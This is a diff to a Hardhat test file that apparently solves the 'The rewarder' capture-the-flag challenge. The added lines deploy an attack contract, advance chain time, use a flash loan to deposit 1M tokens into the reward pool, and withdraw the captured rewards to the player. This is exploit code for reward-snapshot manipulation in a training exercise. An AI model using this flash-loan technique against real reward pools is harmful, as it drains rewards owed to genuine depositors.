@@ -70,6 +70,17 @@ describe('[Challenge] The rewarder', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const AttackFactory = await ethers.getContractFactory('RewarderAttack', player);
+        const attack = await AttackFactory.deploy(flashLoanPool.address, rewarderPool.address, player.address, rewardToken.address, liquidityToken.address);
+
+        // Advance time 5 days so that depositors can get rewards
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+
+        // this will trigger the deposit inside the rewarderPool of 1M DVT
+        await (await attack).callLoan();
+
+        // withdraw the rewards and put it into player
+        await (await attack).connect(player).withdrawRewards();
     });
 
     after(async function () {
